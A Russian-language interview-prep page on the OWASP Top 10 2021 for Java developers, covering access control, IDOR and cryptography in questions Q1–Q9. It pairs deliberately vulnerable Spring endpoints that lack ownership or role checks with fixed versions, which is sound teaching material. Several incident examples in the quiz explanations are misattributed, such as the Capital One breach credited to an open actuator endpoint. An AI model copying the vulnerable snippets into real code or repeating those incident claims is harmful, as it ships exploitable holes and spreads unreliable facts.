---
title: "Вопросы на собеседовании: OWASP Top 10"
description: "Подробные вопросы и ответы по всем 10 категориям OWASP Top 10 2021 для Senior Java Developer: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Auth Failures, Data Integrity Failures, Logging Failures, SSRF"
tags:
  - interview
  - security
  - owasp-top10-interview
type: "interview"
difficulty: "intermediate"
aliases:
  - "Вопросы на собеседовании"
  - "OWASP Top 10"
  - "OWASP Top 10 interview"
  - "OWASP Top 10 собеседование"
prerequisites: []
next: []
updated: "2026-05-08"
---
# Вопросы на собеседовании: `OWASP Top 10`

Подробные вопросы и ответы по всем 10 категориям `OWASP Top 10 2021` для `Senior Java Developer`. Покрывает каждую категорию в глубину: от теории и типичных уязвимостей до практических примеров кода (уязвимый → исправленный) и архитектурных решений.

**`OWASP Top 10`** — стандартный список наиболее критичных рисков безопасности веб-приложений, составляемый `Open Web Application Security Project`. Версия 2021 года включает новые категории (`Insecure Design`, `Software and Data Integrity Failures`, `SSRF`) и переосмысляет ранжирование на основе реальных инцидентов.

## Полезные ссылки

### Официальная документация

- [OWASP Top 10 2021](https://owasp.org/Top10/) — официальный список категорий с описанием
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) — практические рекомендации по каждой категории
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) — методология тестирования безопасности
- [Spring Security Reference](https://docs.spring.io/spring-security/reference/) — безопасность в `Spring` экосистеме
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/) — смежная классификация уязвимостей
- [SQL Injection and How to Prevent It?](https://www.baeldung.com/sql-injection) — SQL-инъекции и защита в Java
- [Prevent Cross-Site Scripting (XSS) in a Spring Application](https://www.baeldung.com/spring-prevent-xss) — защита от XSS в Spring
- [Sanitize HTML Code to Prevent XSS Attacks](https://www.baeldung.com/java-sanitize-html-prevent-xss-attacks) — санитизация HTML в Java
- [Content Security Policy with Spring Security](https://www.baeldung.com/spring-security-csp) — CSP-заголовки в Spring Security

## Содержание

- [Полезные ссылки](#полезные-ссылки)
- [See also](#see-also)

**Общие вопросы по OWASP Top 10**
- [Q1. (!) Что такое OWASP Top 10 и зачем он нужен разработчику?](#q1--что-такое-owasp-top-10-и-зачем-он-нужен-разработчику)
- [Q2. Какие изменения произошли в OWASP Top 10 2021 по сравнению с 2017?](#q2-какие-изменения-произошли-в-owasp-top-10-2021-по-сравнению-с-2017)
- [Q3. Как OWASP оценивает риск каждой категории?](#q3-как-owasp-оценивает-риск-каждой-категории)

**A01: Broken Access Control**
- [Q4. (!) Что такое Broken Access Control и почему это категория №1?](#q4--что-такое-broken-access-control-и-почему-это-категория-1)
- [Q5. (!) Что такое IDOR и как от него защищаться?](#q5--что-такое-idor-и-как-от-него-защищаться)
- [Q6. Чем отличается вертикальная эскалация привилегий от горизонтальной?](#q6-чем-отличается-вертикальная-эскалация-привилегий-от-горизонтальной)
- [Q7. Как реализовать deny-by-default авторизацию в Spring Security?](#q7-как-реализовать-deny-by-default-авторизацию-в-spring-security)

**A02: Cryptographic Failures**
- [Q8. (!) Какие типичные криптографические ошибки допускают разработчики?](#q8--какие-типичные-криптографические-ошибки-допускают-разработчики)
- [Q9. Как правильно хранить пароли в Java-приложении?](#q9-как-правильно-хранить-пароли-в-java-приложении)
- [Q10. Как правильно использовать AES-GCM для шифрования данных?](#q10-как-правильно-использовать-aes-gcm-для-шифрования-данных)

**A03: Injection**
- [Q11. (!) Какие виды Injection-атак существуют и как от них защищаться?](#q11--какие-виды-injection-атак-существуют-и-как-от-них-защищаться)
- [Q12. (!) Как SQL Injection работает через Spring Data JPA и JDBC?](#q12--как-sql-injection-работает-через-spring-data-jpa-и-jdbc)
- [Q13. Что такое XSS и как от него защищаться на бэкенде?](#q13-что-такое-xss-и-как-от-него-защищаться-на-бэкенде)
- [Q14. Что такое Command Injection и как его предотвратить?](#q14-что-такое-command-injection-и-как-его-предотвратить)

**A04: Insecure Design**
- [Q15. (!) Чем Insecure Design отличается от implementation-багов?](#q15--чем-insecure-design-отличается-от-implementation-багов)
- [Q16. Что такое threat modeling и как его применять?](#q16-что-такое-threat-modeling-и-как-его-применять)
- [Q17. Какие secure design patterns должен знать Java-разработчик?](#q17-какие-secure-design-patterns-должен-знать-java-разработчик)

**A05: Security Misconfiguration**
- [Q18. (!) Какие типичные ошибки конфигурации безопасности встречаются в Spring Boot?](#q18--какие-типичные-ошибки-конфигурации-безопасности-встречаются-в-spring-boot)
- [Q19. Как правильно настроить security headers?](#q19-как-правильно-настроить-security-headers)
- [Q20. Как разделить конфигурацию между dev и prod?](#q20-как-разделить-конфигурацию-между-dev-и-prod)

**A06: Vulnerable and Outdated Components**
- [Q21. (!) Как выявлять и управлять уязвимыми зависимостями?](#q21--как-выявлять-и-управлять-уязвимыми-зависимостями)
- [Q22. Что такое SBOM и зачем он нужен?](#q22-что-такое-sbom-и-зачем-он-нужен)
- [Q23. Как организовать SCA в CI/CD pipeline?](#q23-как-организовать-sca-в-cicd-pipeline)

**A07: Identification and Authentication Failures**
- [Q24. (!) Какие ошибки аутентификации наиболее опасны?](#q24--какие-ошибки-аутентификации-наиболее-опасны)
- [Q25. Как защититься от brute force и credential stuffing?](#q25-как-защититься-от-brute-force-и-credential-stuffing)
- [Q26. Как безопасно управлять JWT-токенами?](#q26-как-безопасно-управлять-jwt-токенами)

**A08: Software and Data Integrity Failures**
- [Q27. (!) Что такое supply-chain атаки и как от них защищаться?](#q27--что-такое-supply-chain-атаки-и-как-от-них-защищаться)
- [Q28. Чем опасна небезопасная десериализация в Java?](#q28-чем-опасна-небезопасная-десериализация-в-java)
- [Q29. Как защитить CI/CD pipeline от компрометации?](#q29-как-защитить-cicd-pipeline-от-компрометации)

**A09: Security Logging and Monitoring Failures**
- [Q30. (!) Что должна включать стратегия security-логирования?](#q30--что-должна-включать-стратегия-security-логирования)
- [Q31. Какие события безопасности обязательно логировать?](#q31-какие-события-безопасности-обязательно-логировать)
- [Q32. Как настроить алертинг на security-события?](#q32-как-настроить-алертинг-на-security-события)

**A10: Server-Side Request Forgery (SSRF)**
- [Q33. (!) Что такое SSRF и почему он попал в OWASP Top 10?](#q33--что-такое-ssrf-и-почему-он-попал-в-owasp-top-10)
- [Q34. Как реализовать защиту от SSRF в Java?](#q34-как-реализовать-защиту-от-ssrf-в-java)

**Практика и процессы**
- [Q35. (!) Как встроить OWASP-проверки в SDLC и CI/CD?](#q35--как-встроить-owasp-проверки-в-sdlc-и-cicd)
- [Q36. Какие security-тесты обязательны перед релизом?](#q36-какие-security-тесты-обязательны-перед-релизом)
- [Q37. Как организовать безопасный секрет-менеджмент?](#q37-как-организовать-безопасный-секрет-менеджмент)
- [Q38. Как приоритизировать исправление уязвимостей?](#q38-как-приоритизировать-исправление-уязвимостей)
- [Q39. Что такое Defense in Depth и как применять на практике?](#q39-что-такое-defense-in-depth-и-как-применять-на-практике)
- [Q40. Как подготовиться к вопросам по OWASP на собеседовании?](#q40-как-подготовиться-к-вопросам-по-owasp-на-собеседовании)

**Углублённые вопросы**
- [Q41. (!) Как реализовать Path Traversal защиту в Java?](#q41--как-реализовать-path-traversal-защиту-в-java)
- [Q42. Что такое XXE и как защититься в Java?](#q42-что-такое-xxe-и-как-защититься-в-java)
- [Q43. (!) Как безопасно обрабатывать загрузку файлов в Spring Boot?](#q43--как-безопасно-обрабатывать-загрузку-файлов-в-spring-boot)
- [Q44. Как работает Log4Shell и почему это критично?](#q44-как-работает-log4shell-и-почему-это-критично)
- [Q45. Как реализовать безопасную работу с Cryptographic Keys в Java?](#q45-как-реализовать-безопасную-работу-с-cryptographic-keys-в-java)

---

## Q1. (!) Что такое OWASP Top 10 и зачем он нужен разработчику?

`OWASP Top 10` — это приоритизированный список наиболее критичных классов уязвимостей веб-приложений, составляемый `Open Web Application Security Project` на основе анализа реальных инцидентов. Обновляется каждые 3-4 года; текущая версия — **2021**.

Это **не стандарт** и не исчерпывающий чек-лист, а **модель рисков**, которая помогает команде сфокусироваться на самых вероятных и дорогих проблемах. Для разработчика OWASP Top 10 — это:

1. **Язык коммуникации** с security-командой и заказчиком
2. **Чек-лист** на code review, при проектировании и перед релизом
3. **Базовый минимум** — если вы не покрываете эти 10 категорий, всё остальное бессмысленно
4. **Маппинг на CWE** — каждая категория связана с конкретными `Common Weakness Enumeration`

> **Что хотят услышать на собеседовании**: не просто перечисление 10 пунктов, а понимание того, как OWASP используется в реальном SDLC — от design review до CI/CD quality gates.

> [!mcq]
> - [x] `OWASP Top 10` — приоритизированный список классов уязвимостей, составляемый на основе CVE/инцидентов + опроса экспертов; обновляется каждые 3-4 года. | Не стандарт, а модель рисков: язык коммуникации с security, чек-лист code review, базовый минимум secure SDLC. ✓ ПРИМЕНЯТЬ: GitHub, Netflix используют `OWASP Top 10` как обязательный baseline в `secure SDLC`. 📋 ПРАВИЛО: «`OWASP Top 10` — модель рисков, не стандарт». 🔗 См. Q2, Q3, Q35.
> - [ ] `OWASP Top 10` — обязательный международный стандарт; сертификация по нему требуется для `PCI DSS compliance`. | Это модель рисков, а не сертификация. `PCI DSS 4.0` упоминает `OWASP Top 10` как best practice, но «сертификации» не существует. ❌ ПОСЛЕДСТВИЕ: команда тратит бюджет на «OWASP-сертификацию», аудит `PCI DSS` всё равно требует `Requirement 6.2.4` отдельно — двойные затраты.
> - [ ] `OWASP Top 10` — автоматизированный инструмент сканирования уязвимостей, встраиваемый в CI/CD pipeline. | Top 10 — документ-список, не сканер. `Dependency-Check`/`ZAP` — отдельные инструменты OWASP, использующие Top 10 как справочник. ❌ ПОСЛЕДСТВИЕ: ожидание «OWASP-плагина» вместо настройки `SAST + SCA + Secret Scan` → пробел в CI, уязвимости проходят в prod (как `Equifax 2017` с пропущенным `Apache Struts CVE-2017-5638`).
> - [ ] `OWASP Top 10` — список 10 самых безопасных Java-фреймворков для веб-приложений. | OWASP не ранжирует фреймворки, а описывает классы рисков. ❌ ПОСЛЕДСТВИЕ: разработчик «выбирает фреймворк по OWASP» вместо threat modeling → secure-by-name, но vulnerable-by-design (например, Spring Security без `@PreAuthorize` на сервисе оставляет IDOR).

## Q2. Какие изменения произошли в OWASP Top 10 2021 по сравнению с 2017?

Версия 2021 принесла три новых категории и существенную перегруппировку:

| # | 2017 | 2021 | Изменение |
|---|------|------|-----------|
| A01 | `Injection` | `Broken Access Control` | Поднялся с 5-го места |
| A02 | `Broken Authentication` | `Cryptographic Failures` | Расширен от аутентификации до всей криптографии |
| A03 | `Sensitive Data Exposure` | `Injection` | Опустился с 1-го места |
| A04 | `XXE` | **`Insecure Design`** | **Новая категория** |
| A05 | `Broken Access Control` | `Security Misconfiguration` | Поглотил `XXE` |
| A06 | `Security Misconfiguration` | `Vulnerable Components` | Поднялся |
| A07 | `XSS` | `Auth Failures` | `XSS` вошёл в `Injection` |
| A08 | `Insecure Deserialization` | **`Integrity Failures`** | **Новая**, поглотила десериализацию |
| A09 | `Using Components with Known Vulns` | `Logging Failures` | — |
| A10 | `Insufficient Logging` | **`SSRF`** | **Новая категория** |

Ключевые наблюдения:
- **`Broken Access Control`** стал №1 — он найден в 94% приложений при тестировании
- **`Insecure Design`** подчёркивает, что secure coding без secure design недостаточно
- **`SSRF`** отражает рост cloud-инфраструктуры и атак на metadata endpoints

> [!mcq]
> - [ ] В OWASP Top 10 2021 категория A01 осталась Injection, как в 2017, потому что SQL Injection по-прежнему остаётся самой распространённой проблемой. | Injection опустился с A01:2017 на A03:2021. Категорией №1 в 2021 году стал Broken Access Control (обнаруживается в 94% протестированных приложений). XSS вошёл в Injection как подтип.
> - [x] В OWASP Top 10 2021 появились три новых категории: Insecure Design (A04), Software and Data Integrity Failures (A08) и SSRF (A10); Broken Access Control поднялся до A01. | Верный список изменений. Insecure Design подчёркивает разницу между дизайном и реализацией. A08 поглотила Insecure Deserialization из 2017. SSRF попал в Top 10 из-за роста cloud-инфраструктуры и атак на metadata endpoints.
> - [ ] В OWASP Top 10 2021 появились три новых категории: Broken Access Control (A01), Insecure Design (A04) и SSRF (A10); Injection сохранил первое место. | Broken Access Control — не новая категория: она была в 2017 под номером A05 и поднялась в 2021 до A01. Injection опустился с A01 до A03. Реально новыми категориями 2021 являются только Insecure Design, Integrity Failures и SSRF.
> - [ ] В OWASP Top 10 2021 категория XXE (A04:2017) осталась как отдельная категория A04:2021, но её приоритет снизился из-за распространения JSON API. | XXE не сохранилась как отдельная категория в 2021 — она была поглощена Security Misconfiguration (A05:2021). Место A04 заняла новая категория Insecure Design, которая не связана с XML-парсингом.

## Q3. Как OWASP оценивает риск каждой категории?

Каждая категория оценивается по формуле: **`Risk = Likelihood × Impact`**, где:

- **`Likelihood`** складывается из `Threat Agent`, `Vulnerability Prevalence` и `Detectability`
- **`Impact`** включает `Technical Impact` и `Business Impact`

```mermaid
graph LR
    A[Threat Agent] --> D[Likelihood]
    B[Vulnerability<br/>Prevalence] --> D
    C[Detectability] --> D
    D --> G[Risk]
    E[Technical<br/>Impact] --> F[Impact]
    F --> G
```

На практике OWASP Top 10 2021 использует данные из:
- **Анализа CVE** и инцидентов (data-driven для 8 категорий)
- **Опроса экспертов** (community survey для 3 категорий: `Insecure Design`, `SSRF`, `Integrity Failures`)

> [!mcq]
> - [ ] OWASP оценивает риск по формуле Risk = CVSS × CVE_count; категории с большим количеством связанных CVE получают более высокий приоритет в списке. | OWASP Top 10 не использует CVSS × CVE_count. Формула оценки — Risk = Likelihood × Impact, где Likelihood включает prevalence, threat agent и detectability, а Impact — technical и business impact. CVSS применяется для конкретных CVE, а не для категорий.
> - [x] OWASP оценивает риск по формуле Risk = Likelihood × Impact, где Likelihood складывается из Threat Agent, Vulnerability Prevalence и Detectability; 8 категорий оцениваются data-driven, 3 — через опрос экспертов. | Верное описание. Impact делится на Technical и Business. Data-driven подход использует данные из CVE и инцидентов для 8 категорий, community survey применяется для новых категорий (Insecure Design, SSRF, Integrity Failures), где исторических данных мало.
> - [ ] OWASP оценивает риск только через опрос security-экспертов (community survey); никакие автоматические данные из CVE и инцидентов не используются, чтобы избежать bias инструментов. | Это неверно. OWASP использует data-driven подход для 8 категорий из 10 на основе реальных данных из CVE и результатов пентестов. Community survey применяется только для 3 новых категорий, где исторических данных недостаточно.
> - [ ] OWASP оценивает риск по формуле Risk = Exploitability × PublicDisclosure; категории попадают в Top 10 только при наличии публичного эксплойта. | Наличие публичного эксплойта — фактор приоритизации конкретных CVE, но не метод оценки категорий OWASP Top 10. OWASP учитывает Likelihood (включая prevalence и detectability) и Impact, а не Exploitability × PublicDisclosure.

---

## Q4. (!) Что такое Broken Access Control и почему это категория №1?

`Broken Access Control` (`A01:2021`) — нарушение контроля доступа, когда пользователь может получить доступ к ресурсам или выполнить операции, на которые у него нет прав. Стал №1, потому что обнаруживается в **94% протестированных приложений**.

Типичные проявления:
- **`IDOR`** — прямая ссылка на объект без проверки владельца
- **Вертикальная эскалация** — обычный пользователь вызывает admin-эндпоинт
- **Горизонтальная эскалация** — пользователь A видит данные пользователя B
- **Обход проверок** — манипуляция с путями, HTTP-методами, параметрами
- **`CORS` misconfiguration** — доступ с неавторизованного origin

```mermaid
graph TD
    A[Пользователь] --> B{Авторизация}
    B -->|Проверена| C[Доступ к своему ресурсу]
    B -->|НЕ проверена| D[IDOR / Эскалация]
    D --> E[Чужие данные]
    D --> F[Admin-функции]
    D --> G[Удаление/изменение]
```

Принцип защиты — **deny-by-default** на каждом уровне: контроллер, сервис, база данных. Подробнее о паттернах авторизации — в [вопросах по авторизации](authentication-authorization-patterns-interview.md).

> [!mcq]
> - [ ] `Broken Access Control` (`A01:2021`) — категория №1; основная причина — отсутствие шифрования и слабые алгоритмы хэширования. | Перепутаны категории: шифрование/хэширование — это `A02 Cryptographic Failures`. ❌ ПОСЛЕДСТВИЕ: команда чинит `MD5` → `BCrypt`, считает A01 решённым; через месяц уходят данные клиентов через IDOR в `/api/orders/{id}` (как `USPS 2018`, 60M аккаунтов раскрыто).
> - [x] `Broken Access Control` (`A01:2021`) — №1, найден в 94% приложений; векторы — IDOR, вертикальная/горизонтальная эскалация; защита — deny-by-default на каждом уровне (URL, метод, БД). | IDOR (подмена `accountId`), вертикальная (user→admin), горизонтальная (user A → user B) — разные векторы, разные защиты. ✓ ПРИМЕНЯТЬ: Spring Security `SecurityFilterChain.anyRequest().authenticated()` + `@PreAuthorize` + `PermissionEvaluator` + Row-Level Security в Postgres. 📋 ПРАВИЛО: «Deny-by-default на каждом слое». 🔗 См. Q5, Q6, Q7.
> - [ ] `Broken Access Control` (`A01:2021`) — №1; IDOR — отдельная категория OWASP `Insecure Direct Object Reference`, не входит в A01. | IDOR — подтип A01, а не отдельная категория. ❌ ПОСЛЕДСТВИЕ: разработчик читает только A01 без IDOR-секции, оставляет `findById(id)` без `ownerId`-проверки → утечка чужих заказов (как `Snapchat 2014` с `find_friends` API).
> - [ ] `Broken Access Control` найден в 94% приложений; защита — RBAC на URL-паттернах в `SecurityFilterChain`; проверка ownership в бизнес-логике избыточна. | URL-RBAC решает только вертикальную эскалацию (роли). Горизонтальная (одна роль, разные владельцы) URL-правилами не ловится. ❌ ПОСЛЕДСТВИЕ: `Facebook view-as bug 2018` — токены 50M пользователей утекли через горизонтальную эскалацию, RBAC не помог.

## Q5. (!) Что такое IDOR и как от него защищаться?

`IDOR` (`Insecure Direct Object Reference`) — атака, при которой злоумышленник подменяет идентификатор объекта в запросе и получает доступ к чужим данным.

**Уязвимый код:**
```java
// Нет проверки ownership — любой аутентифицированный пользователь
// может получить данные любого аккаунта, подменив accountId
@GetMapping("/api/accounts/{accountId}")
public Account getAccount(@PathVariable Long accountId) {
    return accountRepository.findById(accountId).orElseThrow();
}
```

**Исправленный код:**
```java
@GetMapping("/api/accounts/{accountId}")
public Account getAccount(@PathVariable Long accountId,
                          @AuthenticationPrincipal UserDetails user) {
    Account account = accountRepository.findById(accountId)
            .orElseThrow(() -> new ResourceNotFoundException("Account not found"));
    
    // Проверка: пользователь — владелец или admin
    if (!account.getOwnerId().equals(user.getId()) 
            && !user.hasAuthority("ROLE_ADMIN")) {
        throw new AccessDeniedException("Not authorized to access this account");
    }
    return account;
}
```

**Ещё надёжнее** — фильтрация на уровне запроса к БД:
```java
@Query("SELECT a FROM Account a WHERE a.id = :id AND a.ownerId = :ownerId")
Optional<Account> findByIdAndOwnerId(@Param("id") Long id, 
                                      @Param("ownerId") Long ownerId);
```

Дополнительные меры:
- Использовать **`UUID`** вместо sequential `Long` для идентификаторов — усложняет перебор
- Централизовать проверку ownership в **`PermissionEvaluator`** (см. [Spring Security](../frameworks/spring/spring-security-interview.md))
- Добавить **`Row Level Security`** на уровне БД как defense in depth

> [!mcq]
> - [ ] IDOR защищается заменой числовых ID на `UUID`: подобрать `UUID` нельзя, поэтому проверка ownership избыточна. | `UUID` лишь усложняет перебор. Если злоумышленник узнал UUID чужого объекта (Referer-leak, скриншот, share-link), он попадает в чужие данные. ❌ ПОСЛЕДСТВИЕ: `Snapchat Snapsaved 2014` — UUID-ссылки на медиа утекли в Google-индекс, 13GB фото скачали без ownership-чека.
> - [x] IDOR защищается проверкой ownership в бизнес-логике (`account.ownerId == currentUser.id`) или фильтрацией в SQL (`WHERE id=:id AND owner_id=:userId`); UUID лишь усложняет перебор, не заменяет проверку. | Фильтрация в `WHERE` лучше post-fetch (нет reference leakage через `findById().orElseThrow()`). ✓ ПРИМЕНЯТЬ: Spring Security `PermissionEvaluator` + `@PreAuthorize("hasPermission(#id, 'Account', 'read')")` централизуют проверку. 📋 ПРАВИЛО: «Ownership проверять в `WHERE`, не после `findById`». 🔗 См. Q4, Q6, Q7.
> - [ ] IDOR защищается URL-паттернами в `SecurityFilterChain`: `.requestMatchers("/api/accounts/{id}").authenticated()` блокирует доступ к чужим ресурсам. | `.authenticated()` — любой залогиненный пользователь, не «только владелец». ❌ ПОСЛЕДСТВИЕ: `First American Financial 2019` — 885M документов о недвижимости доступны через инкремент ID в URL аутентифицированным пользователям; URL-правила authenticated() не помогли.
> - [ ] IDOR защищается шифрованием идентификаторов в API-ответах. | Клиент видит зашифрованные ID своих объектов и шлёт их обратно — это опять же IDOR без проверки прав на сервере. ❌ ПОСЛЕДСТВИЕ: `Hashids` для ID создаёт false sense of security, ownership-проверки не пишут → один залогиненный пользователь читает все заказы маркетплейса.

## Q6. Чем отличается вертикальная эскалация привилегий от горизонтальной?

| Тип | Описание | Пример |
|-----|----------|--------|
| **Вертикальная** | Пользователь получает доступ к функциям более высокой роли | Обычный пользователь вызывает `DELETE /api/admin/users/42` |
| **Горизонтальная** | Пользователь получает доступ к данным другого пользователя той же роли | Пользователь A читает заказы пользователя B через `GET /api/orders/999` |

**Вертикальная** — обычно ошибка в конфигурации маршрутов или отсутствие `@PreAuthorize`:

```java
// Уязвимо: эндпоинт доступен всем аутентифицированным пользователям
@DeleteMapping("/api/admin/users/{id}")
public void deleteUser(@PathVariable Long id) {
    userService.delete(id);
}

// Исправлено: явное ограничение по роли
@PreAuthorize("hasRole('ADMIN')")
@DeleteMapping("/api/admin/users/{id}")
public void deleteUser(@PathVariable Long id) {
    userService.delete(id);
}
```

**Горизонтальная** — более коварная, потому что стандартный RBAC её не ловит. Нужна проверка ownership на уровне бизнес-логики (см. Q5).

> [!mcq]
> - [ ] Вертикальная эскалация — пользователь A читает данные пользователя B той же роли; горизонтальная эскалация — обычный пользователь вызывает admin-эндпоинт. | Определения поменяны местами. Вертикальная эскалация — это переход между уровнями ролей (user → admin). Горизонтальная — доступ к данным другого пользователя той же роли (user A → user B).
> - [ ] Вертикальная эскалация и горизонтальная эскалация — синонимы; оба термина описывают получение доступа к чужим данным через подмену идентификатора. | Это разные типы атак. Вертикальная связана со сменой роли (privilege escalation), горизонтальная — с доступом к данным другого пользователя той же роли (IDOR). Защита тоже разная: RBAC + @PreAuthorize для вертикальной, ownership-проверка для горизонтальной.
> - [x] Вертикальная эскалация — обычный пользователь вызывает admin-эндпоинт (смена роли); горизонтальная — пользователь A читает данные пользователя B той же роли; защиты разные: @PreAuthorize + RBAC vs проверка ownership. | Верное разграничение. Вертикальная ловится стандартным RBAC и проверкой роли на методе. Горизонтальная требует проверки ownership в бизнес-логике или фильтрации по owner_id в SQL-запросе, так как оба пользователя имеют одинаковую роль.
> - [ ] Вертикальная эскалация — атака через подмену HTTP-метода (GET вместо DELETE); горизонтальная — атака через подмену HTTP-заголовков (X-User-Id). | Это неверное определение. Подмена HTTP-метода и заголовков — это конкретные техники обхода проверок, но они не определяют вертикальность/горизонтальность. Вертикальная/горизонтальная — это направления эскалации привилегий по уровням ролей.

## Q7. Как реализовать deny-by-default авторизацию в Spring Security?

Принцип `deny-by-default` означает: всё, что явно не разрешено — запрещено. В `Spring Security` это реализуется через `SecurityFilterChain`:

```java
@Configuration
@EnableMethodSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                // Явно разрешённые пути
                .requestMatchers("/api/public/**", "/health").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                // ВСЁ ОСТАЛЬНОЕ — запрещено
                .anyRequest().authenticated()
            )
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            )
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            );
        return http.build();
    }
}
```

Типичные ошибки:
- Использование `.anyRequest().permitAll()` — отключает защиту для забытых эндпоинтов
- Защита только на уровне URL, без `@PreAuthorize` в сервисах
- Забытые `Actuator` эндпоинты — `/actuator/env` может содержать секреты

> [!mcq]
> - [ ] Deny-by-default реализуется через `.anyRequest().permitAll()` в конце цепочки, чтобы не забыть разрешить публичные эндпоинты. | Это permit-by-default, противоположность принципу. ❌ ПОСЛЕДСТВИЕ: `Capital One 2019` — `/actuator/env` забыли закрыть, `permitAll()` оставил endpoint открытым → утечка credentials для AWS S3, 100M клиентских записей раскрыто, штраф $190M.
> - [ ] Deny-by-default означает только URL-правила в `SecurityFilterChain`; `@PreAuthorize` на методах сервисов избыточен. | URL-правила не покрывают ownership и method-level rules. ❌ ПОСЛЕДСТВИЕ: при URL-only защите аутентифицированный user A через тот же `/api/orders/{id}` читает заказы user B (горизонтальная эскалация); `@PreAuthorize("@own.check(#id)")` на сервисе закрывает дыру.
> - [x] Deny-by-default в Spring Security — `.anyRequest().authenticated()` в конце `authorizeHttpRequests`; явно разрешаются только публичные пути (`/health`, `/api/public/**`), плюс `@PreAuthorize` на сервисах для granular ownership-проверок. | Порядок важен: `permitAll` для публичных, роли для защищённых, `.anyRequest().authenticated()` финальным. ✓ ПРИМЕНЯТЬ: Spring Security `@EnableMethodSecurity` + `@PreAuthorize` — стандарт в Spring Boot Admin, Spring Cloud Config Server. 📋 ПРАВИЛО: «`anyRequest().authenticated()` + `@PreAuthorize` на сервисе». 🔗 См. Q4, Q5, Q18.
> - [ ] Deny-by-default работает автоматически после подключения `spring-boot-starter-security` без `SecurityFilterChain`. | Auto-config даёт лишь HTTP Basic с одним сгенерированным паролем — не полноценная политика. ❌ ПОСЛЕДСТВИЕ: команда полагается на дефолт, в prod все эндпоинты доступны через `user/<random>` из логов; пароль попадает в Kibana → доступ к API через лог-агрегатор.

---

## Q8. (!) Какие типичные криптографические ошибки допускают разработчики?

`Cryptographic Failures` (`A02:2021`) покрывает ошибки в шифровании, хэшировании и обработке чувствительных данных. Основные проблемы:

| Ошибка | Пример | Правильный подход |
|--------|--------|-------------------|
| Хранение паролей в открытом виде или через `MD5`/`SHA-1` | `user.setPassword(rawPassword)` | `BCrypt`, `Argon2`, `scrypt` |
| Слабые алгоритмы шифрования | `DES`, `3DES`, `RC4` | `AES-256-GCM` |
| Отсутствие шифрования данных in transit | `HTTP` вместо `HTTPS` | `TLS 1.2+`, `HSTS` |
| Хардкод ключей в коде | `private static final String KEY = "..."` | `Vault`, `AWS KMS`, `GCP KMS` |
| Использование `ECB` mode | `AES/ECB/PKCS5Padding` | `AES/GCM/NoPadding` |
| Переиспользование `IV`/`nonce` | Статический `IV` для `GCM` | Случайный `IV` при каждом шифровании |
| Собственная криптография | Самописный алгоритм | Проверенные библиотеки (`BouncyCastle`, `Tink`) |

> **На собеседовании** часто спрашивают: «Почему нельзя использовать `MD5` для паролей?» — потому что `MD5` быстрый (GPU перебирает миллиарды хэшей/сек), не использует соль по умолчанию, и имеет коллизии. `BCrypt` специально **замедлён** (cost factor), использует уникальную соль и устойчив к rainbow tables.

> [!mcq]
> - [ ] `Cryptographic Failures` (`A02:2021`) — только ошибки шифрования in transit (`HTTP` вместо `HTTPS`); хранение паролей через `MD5` — тема `Authentication Failures`. | A02 охватывает весь спектр: слабые хэши паролей, слабые шифры, хардкод ключей, отсутствие TLS. ❌ ПОСЛЕДСТВИЕ: `LinkedIn 2012` — пароли в `SHA-1` без соли; 117M хэшей расшифровали через rainbow tables, повторно использованные пароли скомпрометировали другие сервисы.
> - [x] `Cryptographic Failures` (`A02:2021`) — слабые хэши паролей (`MD5`/`SHA-1` вместо `BCrypt`/`Argon2`), слабые шифры (`DES`/`ECB` вместо `AES-GCM`), хардкод ключей, переиспользование `IV`/`nonce` в `GCM`, отсутствие `TLS`. | `BCrypt`/`Argon2` — adaptive hashing (замедление + уникальная соль). `AES-GCM` (AEAD) — authenticated encryption. ✓ ПРИМЕНЯТЬ: Spring Security `BCryptPasswordEncoder(12)` или `Argon2PasswordEncoder` — стандарт в Spring Boot. 📋 ПРАВИЛО: «`Adaptive hashing` для паролей, `AEAD` для данных». 🔗 См. Q9, Q10, Q45.
> - [ ] A02 охватывает слабые алгоритмы, но `AES-ECB` допустим для небольших фиксированных данных — он быстрее `GCM`. | `AES-ECB` детерминирован (один и тот же plaintext → одинаковый ciphertext), паттерны видны в шифре, нет integrity. ❌ ПОСЛЕДСТВИЕ: знаменитый `ECB Penguin` — Adobe 2013 хранила 130M паролей в `3DES-ECB`, паттерны hint'ов раскрыли пароли через анализ повторов.
> - [ ] `BCrypt` — рекомендованный алгоритм для шифрования данных at rest, поскольку медленный и устойчив к атакам. | `BCrypt` — необратимое хэширование, а не шифрование. ❌ ПОСЛЕДСТВИЕ: команда «шифрует» PII через `BCrypt`, на этапе чтения не может расшифровать → данные теряются, эскалация до инцидента; правильно `AES-256-GCM` с ключом в `Vault`/`KMS`.

## Q9. Как правильно хранить пароли в Java-приложении?

Единственный правильный подход — **adaptive hashing** с уникальной солью:

```java
@Configuration
public class PasswordConfig {

    @Bean
    public PasswordEncoder passwordEncoder() {
        // BCrypt с cost factor 12 (~250ms на хэширование)
        return new BCryptPasswordEncoder(12);
    }
}

@Service
@RequiredArgsConstructor
public class UserService {

    private final PasswordEncoder passwordEncoder;
    private final UserRepository userRepository;

    public void registerUser(String username, String rawPassword) {
        // Пароль хэшируется с уникальной солью
        String encoded = passwordEncoder.encode(rawPassword);
        // encoded = "$2a$12$LJ3m4ys..." — содержит алгоритм, cost, соль и хэш
        userRepository.save(new User(username, encoded));
    }

    public boolean authenticate(String username, String rawPassword) {
        User user = userRepository.findByUsername(username)
                .orElseThrow(() -> new BadCredentialsException("Invalid credentials"));
        // matches() извлекает соль из хэша и сравнивает
        return passwordEncoder.matches(rawPassword, user.getPassword());
    }
}
```

Для новых проектов рекомендуется `Argon2` — победитель `Password Hashing Competition`:
```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new Argon2PasswordEncoder(16, 32, 1, 65536, 3);
    // saltLength=16, hashLength=32, parallelism=1, memory=64MB, iterations=3
}
```

> [!mcq]
